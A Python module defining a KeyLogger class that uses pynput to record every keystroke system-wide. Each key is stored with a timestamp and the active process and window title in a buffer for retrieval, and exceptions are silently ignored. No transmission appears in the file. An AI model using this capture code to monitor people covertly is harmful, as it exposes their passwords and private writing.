import threading
from datetime import datetime
from zoneinfo import ZoneInfo

from pynput import keyboard


_SPECIAL_KEYS = {
    keyboard.Key.enter: "[Enter]",
    keyboard.Key.tab: "[Tab]",
    keyboard.Key.backspace: "[Backspace]",
    keyboard.Key.space: "[Space]",
    keyboard.Key.esc: "[Esc]",
    keyboard.Key.delete: "[Delete]",
    keyboard.Key.shift: "[Shift]",
    keyboard.Key.shift_l: "[Shift]",
    keyboard.Key.shift_r: "[Shift]",
    keyboard.Key.ctrl: "[Ctrl]",
    keyboard.Key.ctrl_l: "[Ctrl]",
    keyboard.Key.ctrl_r: "[Ctrl]",
    keyboard.Key.alt: "[Alt]",
    keyboard.Key.alt_l: "[Alt]",
    keyboard.Key.alt_r: "[Alt]",
    keyboard.Key.alt_gr: "[AltGr]",
    keyboard.Key.caps_lock: "[CapsLock]",
    keyboard.Key.up: "[Up]",
    keyboard.Key.down: "[Down]",
    keyboard.Key.left: "[Left]",
    keyboard.Key.right: "[Right]",
    keyboard.Key.home: "[Home]",
    keyboard.Key.end: "[End]",
    keyboard.Key.page_up: "[PageUp]",
    keyboard.Key.page_down: "[PageDown]",
    keyboard.Key.insert: "[Insert]",
    keyboard.Key.print_screen: "[PrintScreen]",
    keyboard.Key.pause: "[Pause]",
    keyboard.Key.num_lock: "[NumLock]",
    keyboard.Key.scroll_lock: "[ScrollLock]",
    keyboard.Key.menu: "[Menu]",
    keyboard.Key.cmd: "[Win]",
    keyboard.Key.cmd_l: "[Win]",
    keyboard.Key.cmd_r: "[Win]",
}

for i in range(1, 13):
    _SPECIAL_KEYS[getattr(keyboard.Key, f"f{i}")] = f"[F{i}]"


def _key_id(key):
    """Return a hashable id for the key (for tracking pressed state)."""
    if hasattr(key, "vk"):
        return ("kc", key.vk, getattr(key, "char", None))
    return ("k", key)


class KeyLogger:
    def __init__(self, timezone_str: str = "Asia/Seoul", process_info_callback=None, on_activity=None):
        self._tz = ZoneInfo(timezone_str)
        self._buffer: list[dict] = []
        self._lock = threading.Lock()
        self._listener: keyboard.Listener | None = None
        self._process_info_callback = process_info_callback
        self._on_activity = on_activity
        self._keys_down: set = set()

    def _on_press(self, key):
        try:
            if key is None:
                return
            kid = _key_id(key)
            if kid in self._keys_down:
                return
            self._keys_down.add(kid)

            if key in _SPECIAL_KEYS:
                key_data = _SPECIAL_KEYS[key]
            elif hasattr(key, "char") and key.char is not None:
                key_data = key.char
            else:
                key_data = f"[{key}]"

            proc_info = {"active_process": "", "active_window": ""}
            if self._process_info_callback:
                try:
                    info = self._process_info_callback()
                    proc_info["active_process"] = info.get("process_name", "")
                    proc_info["active_window"] = info.get("window_title", "")
                except Exception:
                    pass

            entry = {
                "timestamp": datetime.now(self._tz).isoformat(),
                "key_data": key_data,
                **proc_info,
            }

            with self._lock:
                self._buffer.append(entry)
            if self._on_activity:
                try:
                    self._on_activity()
                except Exception:
                    pass
        except Exception:
            pass

    def _on_release(self, key):
        try:
            if key is None:
                return
            kid = _key_id(key)
            self._keys_down.discard(kid)
        except Exception:
            pass

    def start(self):
        if self._listener is not None:
            return
        self._listener = keyboard.Listener(on_press=self._on_press, on_release=self._on_release)
        self._listener.daemon = True
        self._listener.start()

    def stop(self):
        if self._listener is not None:
            self._listener.stop()
            self._listener = None
            self._keys_down.clear()

    def get_and_clear_buffer(self) -> list[dict]:
        with self._lock:
            entries = list(self._buffer)
            self._buffer.clear()
        return entries
